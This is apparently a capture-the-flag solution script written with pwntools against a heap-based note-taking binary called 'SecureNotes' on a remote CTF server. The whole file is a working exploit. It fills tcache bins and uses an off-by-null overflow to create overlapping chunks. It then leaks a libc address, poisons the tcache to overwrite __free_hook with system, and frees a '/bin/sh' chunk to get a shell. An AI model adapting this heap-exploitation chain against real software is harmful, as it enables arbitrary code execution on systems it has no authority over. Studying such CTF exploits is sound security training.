#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./SecureNotes")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")
context.binary = exe

#io = gdb.debug(exe.path, 'c\nset max-visualize-chunk-size 0x500', api=True)
#io = remote('127.0.0.1', 5000)
io = remote('pwn.1nf1n1ty.team', 32338)

def malloc(id, data):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b': ', str(id).encode())
    io.sendafter(b': ', data)

def edit(id, data):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b': ', str(id).encode())
    io.sendafter(b': ', data)

def free(id):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b': ', str(id).encode())

def read(id):
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b': ', str(id).encode())
    return io.recvline()


# fill tcache bins
for i in range(7):
    malloc(40+i, b'x'*0x208)  
    malloc(30+i, b'x'*0x87)
    malloc(20+i, b'x'*0xf7)
    
# create 3 chunks
malloc(0, b'a'*0x18) # off by null
malloc(1, b'b'*0x207) # victim
malloc(2, b'c'*0x87) # consolidate
malloc(3, b'd'*0x17) # guard

# overflow null byte to change size of freed b
edit(1, b'b'*0x1f0+p64(0x200))
for i in range(7):
    free(40+i)
    free(30+i)
free(1)
edit(0, b'a'*0x18) 

# create overlapping chunks - chunk 5 and chunk 7 overlap
malloc(4, b'b'*0xf7)
edit(4, b'b'*0xf0+b'\x00\x01\x00\x00\x00\x00')
malloc(5, b'c'*0xf7)
for i in range(7):
    free(20+i)
free(4)
free(2)
for i in range(7):
    malloc(20+i, b'x'*0xf7)
malloc(6, b'b'*0xf7)

# leak libc address
libc.address = unpack(read(5).strip(), 'all')-0x3ebca0
print(hex(libc.address))

# tcache dup
malloc(7, b'c'*0x67)
free(7)
edit(5, p64(libc.sym.__free_hook))
malloc(8, b'b'*0x67)
malloc(9, b'c'*0x67)
edit(9, p64(libc.sym.system))
malloc(10, b'/bin/sh\x00')
free(10)

io.interactive()
